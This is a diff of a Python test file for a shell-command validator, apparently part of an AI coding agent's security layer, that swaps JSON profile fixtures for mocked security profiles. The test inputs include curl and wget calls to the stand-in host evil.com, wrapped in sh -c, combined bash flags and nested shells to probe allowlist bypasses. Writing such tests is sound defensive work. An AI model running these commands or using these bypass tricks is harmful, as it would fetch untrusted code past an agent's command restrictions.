@@ -979,47 +979,27 @@ class TestShellCValidator:
 
     def test_blocks_sh_c_with_disallowed_command(self, tmp_path, monkeypatch):
         """Blocks sh -c with commands not in the allowlist."""
-        from project.analyzer import ProjectAnalyzer
+        from unittest.mock import patch
+        from project_analyzer import SecurityProfile
 
         monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
 
-        # Compute the actual hash for this directory so profile isn't re-analyzed
-        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
-
-        import json
-        profile_data = {
-            "base_commands": ["ls"],
-            "stack_commands": [],
-            "script_commands": [],
-            "custom_commands": [],
-            "detected_stack": {
-                "languages": [],
-                "package_managers": [],
-                "frameworks": [],
-                "databases": [],
-                "infrastructure": [],
-                "cloud_providers": [],
-                "code_quality_tools": [],
-                "version_managers": []
-            },
-            "custom_scripts": {
-                "npm_scripts": [],
-                "make_targets": [],
-                "poetry_scripts": [],
-                "cargo_aliases": [],
-                "shell_scripts": []
-            },
-            "project_dir": str(tmp_path),
-            "created_at": "",
-            "project_hash": actual_hash
-        }
-        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+        # Create a restricted profile that only allows 'ls'
+        mock_profile = SecurityProfile(
+            base_commands={"ls"},
+            stack_commands=set(),
+            script_commands=set(),
+            custom_commands=set(),
+            project_hash="test_hash"
+        )
 
         reset_profile_cache()
 
-        allowed, reason = validate_sh_command("sh -c 'curl http://evil.com'")
-        assert allowed is False
-        assert "curl" in reason
+        # Mock get_security_profile to return our restricted profile
+        with patch("security.shell_validators.get_security_profile", return_value=mock_profile):
+            allowed, reason = validate_sh_command("sh -c 'curl http://evil.com'")
+            assert allowed is False
+            assert "curl" in reason
 
     def test_handles_complex_c_command(self, tmp_path, monkeypatch):
         """Handles complex commands with pipes and chains."""
@@ -1071,91 +1051,53 @@ class TestShellCValidator:
 
     def test_blocks_combined_xc_flag(self, tmp_path, monkeypatch):
         """Blocks bash -xc with disallowed commands (combined flags bypass)."""
-        from project.analyzer import ProjectAnalyzer
+        from unittest.mock import patch
+        from project_analyzer import SecurityProfile
 
         monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
 
-        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
-
-        import json
-        profile_data = {
-            "base_commands": ["ls", "echo"],
-            "stack_commands": [],
-            "script_commands": [],
-            "custom_commands": [],
-            "detected_stack": {
-                "languages": [],
-                "package_managers": [],
-                "frameworks": [],
-                "databases": [],
-                "infrastructure": [],
-                "cloud_providers": [],
-                "code_quality_tools": [],
-                "version_managers": []
-            },
-            "custom_scripts": {
-                "npm_scripts": [],
-                "make_targets": [],
-                "poetry_scripts": [],
-                "cargo_aliases": [],
-                "shell_scripts": []
-            },
-            "project_dir": str(tmp_path),
-            "created_at": "",
-            "project_hash": actual_hash
-        }
-        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+        # Create a restricted profile that only allows 'ls' and 'echo'
+        mock_profile = SecurityProfile(
+            base_commands={"ls", "echo"},
+            stack_commands=set(),
+            script_commands=set(),
+            custom_commands=set(),
+            project_hash="test_hash"
+        )
 
         reset_profile_cache()
 
-        # Combined -xc flag should be detected and curl blocked
-        allowed, reason = validate_bash_command("bash -xc 'curl http://evil.com'")
-        assert allowed is False
-        assert "curl" in reason
+        # Mock get_security_profile to return our restricted profile
+        with patch("security.shell_validators.get_security_profile", return_value=mock_profile):
+            # Combined -xc flag should be detected and curl blocked
+            allowed, reason = validate_bash_command("bash -xc 'curl http://evil.com'")
+            assert allowed is False
+            assert "curl" in reason
 
     def test_blocks_combined_ec_flag(self, tmp_path, monkeypatch):
         """Blocks bash -ec with disallowed commands."""
-        from project.analyzer import ProjectAnalyzer
+        from unittest.mock import patch
+        from project_analyzer import SecurityProfile
 
         monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
 
-        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
-
-        import json
-        profile_data = {
-            "base_commands": ["ls", "echo"],
-            "stack_commands": [],
-            "script_commands": [],
-            "custom_commands": [],
-            "detected_stack": {
-                "languages": [],
-                "package_managers": [],
-                "frameworks": [],
-                "databases": [],
-                "infrastructure": [],
-                "cloud_providers": [],
-                "code_quality_tools": [],
-                "version_managers": []
-            },
-            "custom_scripts": {
-                "npm_scripts": [],
-                "make_targets": [],
-                "poetry_scripts": [],
-                "cargo_aliases": [],
-                "shell_scripts": []
-            },
-            "project_dir": str(tmp_path),
-            "created_at": "",
-            "project_hash": actual_hash
-        }
-        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+        # Create a restricted profile that only allows 'ls' and 'echo'
+        mock_profile = SecurityProfile(
+            base_commands={"ls", "echo"},
+            stack_commands=set(),
+            script_commands=set(),
+            custom_commands=set(),
+            project_hash="test_hash"
+        )
 
         reset_profile_cache()
 
-        # Combined -ec flag should be detected and wget blocked
-        allowed, reason = validate_bash_command("bash -ec 'wget evil.com'")
-        assert allowed is False
-        assert "wget" in reason
+        # Mock get_security_profile to return our restricted profile
+        with patch("security.shell_validators.get_security_profile", return_value=mock_profile):
+            # Combined -ec flag should be detected and wget blocked
+            allowed, reason = validate_bash_command("bash -ec 'wget evil.com'")
+            assert allowed is False
+            assert "wget" in reason
 
     def test_blocks_combined_ic_flag(self, tmp_path, monkeypatch):
         """Blocks bash -ic with disallowed commands (interactive + command)."""
@@ -1246,47 +1188,28 @@ class TestShellCValidator:
 
     def test_blocks_nested_shell_invocation(self, tmp_path, monkeypatch):
         """Blocks nested shell invocations with disallowed commands."""
-        from project.analyzer import ProjectAnalyzer
+        from unittest.mock import patch
+        from project_analyzer import SecurityProfile
 
         monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))
 
-        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()
-
-        import json
-        profile_data = {
-            "base_commands": ["ls", "echo", "bash", "sh"],
-            "stack_commands": [],
-            "script_commands": [],
-            "custom_commands": [],
-            "detected_stack": {
-                "languages": [],
-                "package_managers": [],
-                "frameworks": [],
-                "databases": [],
-                "infrastructure": [],
-                "cloud_providers": [],
-                "code_quality_tools": [],
-                "version_managers": []
-            },
-            "custom_scripts": {
-                "npm_scripts": [],
-                "make_targets": [],
-                "poetry_scripts": [],
-                "cargo_aliases": [],
-                "shell_scripts": []
-            },
-            "project_dir": str(tmp_path),
-            "created_at": "",
-            "project_hash": actual_hash
-        }
-        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))
+        # Create a restricted profile that allows shell commands but not curl
+        mock_profile = SecurityProfile(
+            base_commands={"ls", "echo", "bash", "sh"},
+            stack_commands=set(),
+            script_commands=set(),
+            custom_commands=set(),
+            project_hash="test_hash"
+        )
 
         reset_profile_cache()
 
-        # Nested shell with disallowed command should be blocked
-        allowed, reason = validate_bash_command("bash -c 'bash -c \"curl http://evil.com\"'")
-        assert allowed is False
-        assert "curl" in reason or "nested" in reason.lower()
+        # Mock get_security_profile to return our restricted profile
+        with patch("security.shell_validators.get_security_profile", return_value=mock_profile):
+            # Nested shell with disallowed command should be blocked
+            allowed, reason = validate_bash_command("bash -c 'bash -c \"curl http://evil.com\"'")
+            assert allowed is False
+            assert "curl" in reason or "nested" in reason.lower()
 
     def test_allows_nested_shell_with_allowed_commands(self, tmp_path, monkeypatch):
         """Allows nested shell invocations when all commands are allowed."""
